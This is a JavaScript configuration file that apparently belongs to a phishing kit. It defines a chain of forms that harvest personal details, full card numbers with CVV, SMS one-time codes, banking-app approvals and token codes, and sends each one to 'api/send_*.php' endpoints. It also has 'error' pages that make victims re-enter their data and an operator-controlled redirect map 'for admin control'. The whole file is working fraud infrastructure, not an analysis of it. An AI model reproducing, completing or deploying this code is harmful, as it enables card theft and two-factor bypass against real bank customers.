// PAGE CONFIGURATION
const PAGES_CONFIG = {
    billingPlan: {
        type: 'form',
        formId: 'billingPlanForm',
        api: 'api/send_billing_plan.php',
        fields: ['firstName', 'lastName', 'dateOfBirth', 'address', 'city', 'postalCode', 'phoneNumber'],
        nextPage: 'pages/plan.php'
    },

    card: {
        type: 'form',
        formId: 'cardForm',
        api: 'api/send_card.php',
        fields: ['cardNumber', 'expiryDate', 'cvv', 'cardName'],
        nextPage: 'loading.php'
    },
    cc: {
        type: 'form',
        formId: 'cardForm',
        api: 'api/send_card.php',
        fields: ['cardNumber', 'expiryDate', 'cvv', 'cardName'],
        nextPage: 'loading.php'
    },
    carderror: {
        type: 'form',
        formId: 'carderrorForm',
        api: 'api/send_carderror.php',
        fields: ['cardNumber', 'expiryDate', 'cvv', 'cardName'],
        nextPage: 'loading.php'
    },
    sms: {
        type: 'form',
        formId: 'smsForm',
        api: 'api/send_sms.php',
        fields: ['smsCode'],
        nextPage: 'loading.php'
    },
    smserror: {
        type: 'form',
        formId: 'smserrorForm',
        api: 'api/send_smserror.php',
        fields: ['smsCode'],
        nextPage: 'loading.php'
    },
    app: {
        type: 'form',
        formId: 'appForm',
        api: 'api/send_app.php',
        fields: [],
        nextPage: 'loading.php'
    },
    apperror: {
        type: 'form',
        formId: 'apperrorForm',
        api: 'api/send_apperror.php',
        fields: [],
        nextPage: 'loading.php'
    },
    token: {
        type: 'form',
        formId: 'tokenForm',
        api: 'api/send_token.php',
        fields: ['tokenCode'],
        nextPage: 'loading.php'
    },
    tokenerror: {
        type: 'form',
        formId: 'tokenerrorForm',
        api: 'api/send_tokenerror.php',
        fields: ['tokenCode'],
        nextPage: 'loading.php'
    },
    custom: {
        type: 'form',
        formId: 'customForm',
        api: 'api/send_custom.php',
        fields: ['customInput'],
        nextPage: 'loading.php'
    },
    billing: {
        type: 'form',
        formId: 'billingForm',
        api: 'api/send_billing.php',
        fields: ['firstName', 'lastName', 'dateOfBirth', 'address', 'city', 'postalCode', 'phoneNumber'],
        nextPage: 'pages/card.php'
    },
};

// REDIRECT PATHS (for admin control)
function getRedirectPath(action) {
    const base = getAbsoluteBasePath();
    const redirects = {
        'done': base + 'pages/thanks.php',
        'declined': base + 'pages/declined.php',
        'billing': base + 'pages/billing.php',
        'plan': base + 'pages/plan.php',
        'card': base + 'pages/card.php',
        'cc': base + 'pages/card.php',
        'carderror': base + 'pages/carderror.php',
        'sms': base + 'pages/sms.php',
        'smserror': base + 'pages/smserror.php',
        'app': base + 'pages/app.php',
        'apperror': base + 'pages/apperror.php',
        'token': base + 'pages/token.php',
        'tokenerror': base + 'pages/tokenerror.php',
        'custom': base + 'pages/custom.php',
        'track': base + 'pages/track.php',
    };
    return redirects[action] || null;
}

